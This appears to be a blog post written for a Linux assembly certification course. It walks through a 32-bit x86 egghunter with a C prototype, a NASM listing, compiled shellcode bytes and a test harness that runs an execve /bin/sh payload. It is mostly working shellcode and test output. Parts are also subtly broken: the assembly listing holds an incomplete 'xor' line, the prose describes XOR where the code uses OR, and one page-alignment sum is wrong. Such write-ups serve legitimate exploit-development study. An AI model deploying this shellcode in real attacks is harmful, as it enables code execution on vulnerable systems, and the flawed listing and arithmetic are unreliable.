---
layout: single
title: Egghunter Linux Shellcode
date: 2018-11-19
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - slae
  - infosec
tags:
  - slae
  - assembly
  - egghunter
---

An egghunter can be useful in situations where the buffer space the attacker controls is limited and doesn't allow for a full shellcode to be placed on the stack. The egghunter acts as a staged payload: the smaller payload which is executed first looks through the entire process memory space for a marker (the egg) indicating the start of the larger payload. Once the egg is found, the stager jumps to the memory address following the egg and executes the shellcode.

There's a few gotchas though that the egghunter has to watch out for:

The main problem the egghunter has to work around is segfaults when trying to access an area of memory that is not allocated. To prevent this, the `access` function is called for each memory page and only if the page can be accessed will the shellcode look for the egg inside it. By default, Linux uses a page size of 4096 bytes so if an `EFAULT` is returned after calling `access`, we skip to the next page to avoid segfaulting.

The egghunter must also avoid locating itself in memory and jumping to the wrong address.

As shown here in the memory map, the stack is located at a higher address than the `.text` segment (0x08048000) so if we look in memory for the egg starting from the lower addresses, we'll match the string in the egghunter code instead of the egg in front of the 2nd stage shellcode (located on the stack).
```
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /home/slemire/slae32/assignment3/egghunter_c
0x08049000 0x0804a000 0x00000000 r-x /home/slemire/slae32/assignment3/egghunter_c
0x0804a000 0x0804b000 0x00001000 rwx /home/slemire/slae32/assignment3/egghunter_c
0xb7e19000 0xb7e1a000 0x00000000 rwx 
0xb7e1a000 0xb7fca000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xb7fca000 0xb7fcc000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xb7fcc000 0xb7fcd000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xb7fcd000 0xb7fd0000 0x00000000 rwx 
0xb7fd6000 0xb7fd7000 0x00000000 rwx 
0xb7fd7000 0xb7fda000 0x00000000 r-- [vvar]
0xb7fda000 0xb7fdb000 0x00000000 r-x [vdso]
0xb7fdb000 0xb7ffe000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xb7ffe000 0xb7fff000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xb7fff000 0xb8000000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xbffdf000 0xc0000000 0x00000000 rwx [stack]
```

Let's say we have an egghunter program that used an egg with the bytes `DEAD`. Using `gef` for `gdb`, if we search for `DEAD` in memory we find a copy in the `.text` section at address `0x8048531` and another one in the stack at address `0xbffff1a8`. The 2nd one in the stack is the egg.
```
[+] Searching 'DEAD' in memory
[+] In '/home/slemire/slae32/assignment3/egghunter_c'(0x8048000-0x8049000), permission=r-x
  0x8048531 - 0x8048535  →   "DEAD[...]" 
  0x804853b - 0x804853f  →   "DEAD[...]" 
  0x8048545 - 0x8048549  →   "DEAD[...]" 
[+] In '/home/slemire/slae32/assignment3/egghunter_c'(0x8049000-0x804a000), permission=r-x
  0x8049531 - 0x8049535  →   "DEAD[...]" 
  0x804953b - 0x804953f  →   "DEAD[...]" 
  0x8049545 - 0x8049549  →   "DEAD[...]" 
[+] In '[stack]'(0xbffdf000-0xc0000000), permission=rwx
  0xbffff1a8 - 0xbffff1ac  →   "DEAD[...]" 
  0xbffff1cc - 0xbffff1d0  →   "DEAD[...]" 
  0xbffff1d0 - 0xbffff1d4  →   "DEAD[...]" 
[...]
gef➤  search-pattern DEADDEAD
[+] Searching 'DEADDEAD' in memory
[+] In '[stack]'(0xbffdf000-0xc0000000), permission=rwx
  0xbffff1cc - 0xbffff1d4  →   "DEADDEAD[...]" 
```

To avoid matching the string in the code itself, the egghunter code will look for the egg repeated twice. If the egg is only found once, the code assumes this is the string from the `.text` section, ignores it and keeps searching.

### C prototype
--------------

To start with, a C prototype was created to experiment with the egghunter concept. In this example, the egg is `DEAD` (4 bytes). The code is not optimized for speed and as such will start looking in memory at address `0x0`. There are probably better ways to optimize this, like start searching at addresses higher than the `.text` section, but these addresses could vary if ASLR is used.

The following code shows the C prototype for the egghunter.
```c
#include <errno.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
        char egg[4] = "DEAD";
        char buffer[1024] = "DEADDEAD\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";
        unsigned long addr = 0x0;
        int r;

        while (1) {
                // Try to read 8 bytes ahead of current memory pointer (8 bytes because the egg will be repeated twice)
                r = access(addr+8, 0);
                // If we don't get an EFAULT, we'll start checking for the egg
                if (errno != 14) {
                        // Need to check egg twice, so we don't end up matching the egg from our own code
                        if (strncmp(addr, egg, 4) == 0 && strncmp(addr+4, egg, 4) == 0) {
                                char tmp[32];
                                memset(tmp, 0, 32);
                                strncpy(tmp, addr, 8);
                                printf("Egg found at: %ul %s, jumping to shellcode (8 bytes ahead of egg address)...\n", addr, tmp);
                                // Jump to shellcode
                                int (*ret)() = (int(*)())addr+8;
                                ret();
                        }
                        // Egg not found, keep going one byte at a time
                        addr++;
        } else {
                        // EFAULT on access, skip to next memory page
                        addr = addr + 4095;
                }
        }
}
```

Now, it's time to test the egghunter C prototype. Because the buffer containing the 2nd stage of the shellcode is located on the stack and the egghunter will jump to that memory location once it finds the egg, the `-z execstack` argument must be passed to the gcc compiler to make the stack executable otherwise it'll just segfault after jumping.
```
slemire@slae:~/slae32/assignment3$ ./egghunter_c
Egg found at: 3221221888l DEADDEAD, jumping to shellcode (8 bytes ahead of egg address)...
$ id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Nice, now let's build the assembly version with NASM.

### Assembly version of the egghunter
-------------------------------------

First, registers are cleared and the egg is moved in `$esi`. We'll use that register later when we compare memory content against the egg.

The `mul ecx` instruction is a little trick to reduce shellcode size: It multiplies `$eax` by `$ecx` (which was already zeroed out with the `xor` instruction), and the results are stored in both `$eax` and `$edx`. So basically with a single instruction, we can null out both `$eax` and `$edx`.

```nasm
    ; Zero registers
    xor eax, eax
    xor 
    xor ecx, ecx            ; ecx = 0
    mul ecx                 ; eax = 0, edx = 0
    mov esi, 0xdeadbeef     ; our egg: 0xDEADBEEF
```

The `$edx` register is used to keep track of the memory address being read. To check is memory is accessible, `access` is used at follows:

```nasm
    ; check if we can read the memory
    xor eax, eax
    mov al, 0x21            ; sys_access
    lea ebx, [edx+8]        ; const char __user *filename
    int 0x80                ; sys_access
    cmp al, 0xf2            ; Check if we have an EFAULT
    jz next_page            ; jump to next page if a fault is raised
```    

If we get an `EFAULT`, we need to move to the next memory page (4096 bytes ahead), otherwise the code would run a lot more slowly since we know all 4096 bytes in the current memory page with also generate an `EFAULT`. To optimize the process, the current address is XORed with `4095` so the next loop iteration that increases the `$edx` register by 1 will end up in the next memory page.

For example, if we just got a fault reading address `0xb7e19000`, XORing the address with `0xfff` results in `0xb7e19fff`. Then `0xb7e19fff` + 1 = `0xb7e18000` (start of the next page).

```nasm
    next_page:
    or dx, 0xfff            ; align page 

    next_byte:
    inc edx                 ; set address to beginning of the memory page
```

If there's no fault resulting from `access`, we can safely looks through the page one byte at a time. We can use the `cmp` instruction using the current `$edx` value against the `$esi` register that contains the egg value. We also need to repeat the comparison a 2nd time to avoid matching the egg value from the code itself as explained earlier. If the egg is matched, the memory address following the 2nd copy of the egg is copied into `$esi` and the code jumps to it, executing the 2nd shellcode located there.

```nasm
    ; search for the egg
    cmp [edx], esi
    jnz next_byte

    ; search again for 2nd copy of the egg (avoid matching code itself)
    cmp [edx+4], esi
    jnz next_byte

    ; egg found, jump to shellcode
    lea esi, [edx + 8]
    jmp esi
```

The final version of the egghunter code is shown below:
```nasm
global _start

section .text

_start:

    ; Zero registers
    xor eax, eax
    xor 
    xor ecx, ecx            ; ecx = 0
    mul ecx                 ; eax = 0, edx = 0
    mov esi, 0xdeadbeef     ; our egg: 0xDEADBEEF

    next_page:
    or dx, 0xfff            ; align page 

    next_byte:
    inc edx                 ; set address to beginning of the memory page

    ; check if we can read the memory
    xor eax, eax
    mov al, 0x21            ; sys_access
    lea ebx, [edx+8]        ; const char __user *filename
    int 0x80                ; sys_access
    cmp al, 0xf2            ; Check if we have an EFAULT
    jz next_page            ; jump to next page if a fault is raised

    ; search for the egg
    cmp [edx], esi
    jnz next_byte

    ; search again for 2nd copy of the egg (avoid matching code itself)
    cmp [edx+4], esi
    jnz next_byte

    ; egg found, jump to shellcode
    lea esi, [edx + 8]
    jmp esi
```

Compiling the shellcode with NASM:
```
slemire@slae:~/slae32/assignment3$ ../compile.sh egghunter
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \x31\xc9\xf7\xe1\xbe\xef\xbe\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\x8d\x72\x08\xff\xe6
[+] Length: 42
[+] Done!
```

To test the egghunter shellcode, a skeleton C program is used. The `buffer` array contains a simple execve shellcode prepended by two copies of the egg `0xdeadbeef` (in little-endian format).
```c
#include <stdio.h>

char buffer[1024] = "\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
char shellcode[] = "\x31\xc9\xf7\xe1\xbe\xef\xbe\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\x8d\x72\x08\xff\xe6";

int main()
{
        int (*ret)() = (int(*)())shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        ret();
}
```

The following output shows that the shellcode works as intended and is able to locate the egg and execute the 2nd stage payload.
```
slemire@slae:~/slae32/assignment3$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment3$ ./shellcode
Size: 43 bytes.
$ id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1236

All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)